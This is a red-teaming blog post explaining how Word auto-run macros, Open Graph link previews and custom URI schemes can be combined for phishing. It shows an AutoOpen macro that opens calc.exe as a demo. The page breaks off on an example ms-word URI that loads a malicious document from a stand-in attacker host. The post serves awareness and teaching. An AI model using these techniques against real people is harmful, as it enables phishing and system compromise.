<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Abusing OG Protocol With Macros" />
<meta property="og:locale" content="en" />
<meta name="description" content="Disclaimer:" />
<meta property="og:description" content="Disclaimer:" />
<link rel="canonical" href="http://localhost:4000/posts/Abusing-OG-Protocol-With-Macros/" />
<meta property="og:url" content="http://localhost:4000/posts/Abusing-OG-Protocol-With-Macros/" />
<meta property="og:site_name" content="Hell’s Executioner" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-03-06T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Abusing OG Protocol With Macros" />
<meta name="twitter:site" content="@Abo_Elnasr101" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-08-04T07:53:40+02:00","datePublished":"2025-03-06T00:00:00+02:00","description":"Disclaimer:","headline":"Abusing OG Protocol With Macros","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Abusing-OG-Protocol-With-Macros/"},"url":"http://localhost:4000/posts/Abusing-OG-Protocol-With-Macros/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Abusing OG Protocol With Macros | Hell’s Executioner
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Hell’s Executioner">
<meta name="application-name" content="Hell’s Executioner">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Outfit:wght@500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>
  <script>
document.addEventListener("DOMContentLoaded", function () {
  // --- Scroll Animations ---
  const observerOptions = {
    threshold: 0.1,
    rootMargin: "0px 0px -50px 0px"
  };

  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.classList.add("in-view");
        observer.unobserve(entry.target);
      }
    });
  }, observerOptions);

  const elementsToAnimate = document.querySelectorAll("article h1, article h2, article p, article pre, article img, .post-content > *");
  elementsToAnimate.forEach((el) => {
    el.classList.add("fade-in-up");
    observer.observe(el);
  });

  // --- 3D Tilt Effect for Cards ---
  const cards = document.querySelectorAll('.card, .post-preview'); // Adjust selectors as needed

  cards.forEach(card => {
    card.addEventListener('mousemove', (e) => {
      const rect = card.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      
      const centerX = rect.width / 2;
      const centerY = rect.height / 2;
      
      const rotateX = ((y - centerY) / centerY) * -5; // Max 5deg rotation
      const rotateY = ((x - centerX) / centerX) * 5;

      card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
      card.style.transition = 'transform 0.1s ease';
    });

    card.addEventListener('mouseleave', () => {
      card.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)';
      card.style.transition = 'transform 0.5s ease';
    });
  });

  // --- Typing Effect for Tagline ---
  const tagline = document.querySelector('.site-subtitle, .tagline'); // Adjust selector
  if (tagline) {
    const text = tagline.innerText;
    tagline.innerText = '';
    tagline.style.opacity = '1'; // Ensure it's visible if hidden by CSS
    
    let i = 0;
    function typeWriter() {
      if (i < text.length) {
        tagline.innerHTML += text.charAt(i);
        i++;
        setTimeout(typeWriter, 50); // Speed: 50ms
      }
    }
    
    // Add blinking cursor effect
    const style = document.createElement('style');
    style.innerHTML = `
      .site-subtitle::after {
        content: '|';
        animation: blink 1s step-end infinite;
      }
      @keyframes blink { 50% { opacity: 0; } }
    `;
    document.head.appendChild(style);
    
    setTimeout(typeWriter, 500); // Start after 500ms
  }
});
</script>


  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/mem.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Hell’s Executioner</a>
    <p class="site-subtitle fst-italic mb-0">Red teaming with a devilish touch.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
   
      

      
        <a
          href="https://github.com/MohamedAboElnasr"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
   
      

      
        <a
          href="https://twitter.com/Abo_Elnasr101"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
   
      

      
        <a
          href="https://www.linkedin.com/in/abo-elnasr"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
   
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['ggta8080','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
   
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Abusing OG Protocol With Macros</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->


 





<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Abusing OG Protocol With Macros</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1741212000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar  6, 2025
</time>

      </span>

      <!-- lastmod date -->
      
      <span>
        Updated <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1754286820"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug  4, 2025
</time>

      </span>
       

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
           By

          <em>
            
            <a href="https://twitter.com/Abo_Elnasr101">Aboelnasr</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1217 words"
>
  <em>6 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
  <div
    id="toc-bar"
    class="d-flex align-items-center justify-content-between invisible"
  >
    <span class="label text-truncate">Abusing OG Protocol With Macros</span>
    <button type="button" class="toc-trigger btn me-1">
      <i class="fa-solid fa-list-ul fa-fw"></i>
    </button>
  </div>

  <button
    id="toc-solo-trigger"
    type="button"
    class="toc-trigger btn btn-outline-secondary btn-sm"
  >
    <span class="label ps-2 pe-1"
      >Contents</span
    >
    <i class="fa-solid fa-angle-right fa-fw"></i>
  </button>

  <dialog id="toc-popup" class="p-0">
    <div
      class="header d-flex flex-row align-items-center justify-content-between"
    >
      <div class="label text-truncate py-2 ms-4">Abusing OG Protocol With Macros</div>
      <button
        id="toc-popup-close"
        type="button"
        class="btn mx-1 my-1 opacity-75"
      >
        <i class="fas fa-close"></i>
      </button>
    </div>
    <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
  </dialog>
  

  <div class="content"><p><strong>Disclaimer:</strong></p>

<p>This post is for <strong>educational and informational purposes only</strong>. It is intended to raise awareness about how certain technologies work and should <strong>not</strong> be used for any malicious or unethical activities. Misusing this information may violate laws and terms of service, leading to serious legal consequences. The author <strong>does not</strong> encourage or condone any illegal actions. <strong>Use this knowledge responsibly.</strong></p>
<h1 id="introduction">Introduction</h1>
<p>Hello there! I’m Mohamed Aboelnasr, and in this article, we’ll dive into how adversaries can weaponize the <strong>Open Graph (OG) protocol</strong> and <strong>macros inside Word files</strong> to craft <strong>effective phishing attacks</strong> and achieve initial access. By combining these two techniques, attackers can enhance social engineering tactics and bypass common security measures.</p>

<hr />
<h3 id="what-are-macros-in-microsoft-word"><span class="me-2">What Are Macros in Microsoft Word?</span><a href="#what-are-macros-in-microsoft-word" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Macros in Microsoft Word are <strong>automated sequences of commands</strong> written in <strong>Visual Basic for Applications (VBA)</strong> that perform repetitive tasks. They allow users to automate workflows, but they are also <strong>a common attack vector</strong> exploited by adversaries for malicious purposes.</p>
<h4 id="how"><span class="me-2">How?</span><a href="#how" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ol>
  <li><strong>Delivery</strong> – The attacker sends a phishing email with a <strong>Word document attachment</strong> (e.g., “Invoice.docm” or “Urgent_Report.docm”).</li>
  <li><strong>Social Engineering</strong> – The document tricks the user into <strong>enabling macros</strong> by displaying fake warnings (e.g., “This document is protected, enable macros to view content”).</li>
  <li><strong>Execution</strong> – Once macros are enabled, the VBA script:
    <ul>
      <li><strong>Downloads and executes malware</strong> (like a RAT, ransomware, or keylogger).</li>
      <li><strong>Runs PowerShell or CMD commands</strong> to create a backdoor.</li>
      <li><strong>Modifies system settings</strong> to establish persistence.</li>
    </ul>
  </li>
  <li><strong>Compromise</strong> – The attacker gains <strong>initial access</strong> to the system, which can lead to full compromise.</li>
</ol>

<p>in the following image is how macros are added to a word file 
<a href="https://github.com/user-attachments/assets/46412b21-d2ce-403c-8c94-eb1da48ec446" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/46412b21-d2ce-403c-8c94-eb1da48ec446" alt="Image" loading="lazy"></a></p>

<p>There are <strong>auto-execution macros</strong>, meaning they run or executed <strong>automatically</strong> when a Word document is opened, e.g., <code class="language-plaintext highlighter-rouge">AutoOpen()</code> and <code class="language-plaintext highlighter-rouge">Document_Open()</code> auto macros.</p>
<pre><code class="language-vba">Sub AutoOpen()
    Dim str As String
    str = "calc.exe"
    Shell str, vbNormalFocus
End Sub
</code></pre>

<blockquote>
  <p><em>For the sake of this demo, we will simply open <code class="language-plaintext highlighter-rouge">calc.exe</code> to demonstrate how macros work. This harmless example illustrate how attackers can use VBA to execute commands on a victim’s machine.</em></p>
</blockquote>

<p><a href="https://github.com/user-attachments/assets/6a1c995a-decd-4c0e-9138-dea7a882919f" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/6a1c995a-decd-4c0e-9138-dea7a882919f" alt="Image" loading="lazy"></a>
now anyone opens this document and enables the macros the calculator will open.
<a href="https://github.com/user-attachments/assets/c50cf3c5-5a18-4384-8b35-95bf1931e7d2" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/c50cf3c5-5a18-4384-8b35-95bf1931e7d2" alt="Image" loading="lazy"></a></p>

<hr />
<h3 id="what-are-open-graph-og"><span class="me-2">What Are Open Graph (OG):</span><a href="#what-are-open-graph-og" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Open Graph (OG) is a metadata protocol introduced by Facebook that allows web pages to control how their content appears when shared on social media platforms. By using OG meta tags, websites can define the title, description, image, and URL displayed in link previews, making shared links more visually appealing and engaging. While OG is designed for legitimate content sharing, adversaries can manipulate it to craft deceptive previews that enhance phishing and social engineering attacks.
In the following image, you can see how a shared post or link might appear on social media:</p>

<p><a href="https://github.com/user-attachments/assets/8324182a-2fee-4d35-9a99-ccf9effce8e3" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/8324182a-2fee-4d35-9a99-ccf9effce8e3" alt="Image" loading="lazy"></a></p>

<p>This preview is controlled by <strong>Open Graph (OG) meta tags</strong> embedded within an HTML file. Below is an example of OG metadata that defines how this link is displayed when shared:</p>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:title"</span> <span class="na">content=</span><span class="s">"Unveiling Hidden Secrets"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:description"</span> <span class="na">content=</span><span class="s">"A deep dive into deceptive techniques used in phishing and social engineering attacks."</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:image"</span> <span class="na">content=</span><span class="s">"https://example.com/dark-secrets.jpg"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:url"</span> <span class="na">content=</span><span class="s">"https://example.com/phishing-techniques"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Unveiling Hidden Secrets<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>How Attackers Manipulate Open Graph<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;p&gt;</span>Explore how adversaries exploit OG metadata to craft deceptive link previews.<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>These <strong>OG meta tags</strong> tell platforms like <strong>Facebook, Twitter, and LinkedIn</strong> how to display the <strong>title, description, image, and URL</strong> when the page is shared. <strong>Attackers often abuse this to create misleading previews</strong> that look legitimate but lead to malicious websites.</p>

<hr />
<h3 id="how-do-apps-like-zoom-or-teams-open-from-a-browser-click"><span class="me-2"><strong>How Do Apps Like Zoom or Teams Open from a Browser Click?</strong></span><a href="#how-do-apps-like-zoom-or-teams-open-from-a-browser-click" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Have you ever clicked a meeting link and suddenly <strong>Zoom, Microsoft Teams, or another app pops up</strong>—seamlessly opening the meeting? This isn’t magic; it’s made possible by <strong>Custom URI Schemes</strong>.
let’s take a step back and talk about a custom URI Scheme</p>
<h3 id="what-is-a-custom-uri-scheme"><span class="me-2"><strong>What Is a Custom URI Scheme?</strong></span><a href="#what-is-a-custom-uri-scheme" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>A <strong>Custom URI Scheme</strong> allows installed applications to define their own <strong>protocol handlers</strong>, enabling browsers to interact directly with them. Instead of just opening a webpage, a <strong>custom URL can launch an app</strong> and pass specific instructions.</p>
<h4 id="examples-of-custom-uri-schemes-"><span class="me-2"><strong>Examples of Custom URI Schemes :</strong></span><a href="#examples-of-custom-uri-schemes-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li><strong>Zoom:</strong> <code class="language-plaintext highlighter-rouge">zoommtg://zoom.us/join?confno=123456789</code> → Opens the Zoom app and joins a meeting.</li>
  <li><strong>Microsoft Teams:</strong> <code class="language-plaintext highlighter-rouge">msteams://teams.microsoft.com/l/meetup-join/...</code> → Launches Teams and joins a meeting.</li>
</ul>

<h4 id="how-custom-uri-schemes-registered-in-windows-"><span class="me-2"><strong>How Custom URI Schemes Registered in Windows :</strong></span><a href="#how-custom-uri-schemes-registered-in-windows-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>i created a custom uri for opening the notepad just for demonstration, and it’s not hard you just need to register a custom uri in the registry editor as the following</p>
<ol>
  <li>Open <strong>Registry Editor</strong> (<code class="language-plaintext highlighter-rouge">regedit</code>).</li>
  <li>create a new key name it notepad and Navigate to it and add a new string named ‘URL Protocol’ with empty value:
    <div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> HKEY_CLASSES_ROOT\notepad
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Create a <strong>new key</strong> named <code class="language-plaintext highlighter-rouge">shell\open\command</code>.</li>
  <li>
    <p>Set the <strong>default value</strong> of <code class="language-plaintext highlighter-rouge">command</code> to:</p>

    <div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> C:\Windows\System32\notepad.exe
</pre></td></tr></tbody></table></code></div>    </div>
    <p><a href="https://github.com/user-attachments/assets/7bcc1a58-ac09-4fdd-a1f3-217d870b0755" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/7bcc1a58-ac09-4fdd-a1f3-217d870b0755" alt="Image" loading="lazy"></a></p>
  </li>
  <li>Now, typing <code class="language-plaintext highlighter-rouge">notepad://</code> in a browser or Run dialog <code class="language-plaintext highlighter-rouge">Win+R</code> will open Notepad.
<a href="https://github.com/user-attachments/assets/94fa6896-e5a0-42b5-b84b-ae401f39c29d" class="popup img-link  shimmer"><img src="https://github.com/user-attachments/assets/94fa6896-e5a0-42b5-b84b-ae401f39c29d" alt="Image" loading="lazy"></a></li>
</ol>

<hr />
<h3 id="how-attackers-exploit-this-mechanism"><span class="me-2"><strong>How Attackers Exploit This Mechanism</strong></span><a href="#how-attackers-exploit-this-mechanism" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>While these schemes are designed for convenience, <strong>attackers can take advantage of them</strong> to launch <strong>malicious actions with minimal user interaction</strong>. A well-crafted phishing attack might:</p>
<ol>
  <li><strong>Use Open Graph (OG) manipulation</strong> to create a fake, enticing preview of a “secure document” or “urgent meeting.”</li>
  <li><strong>Embed a malicious Custom URI link</strong> (e.g., <code class="language-plaintext highlighter-rouge">ms-word:ofe|u|https://attacker.com/malicious.docm</code>).</li>
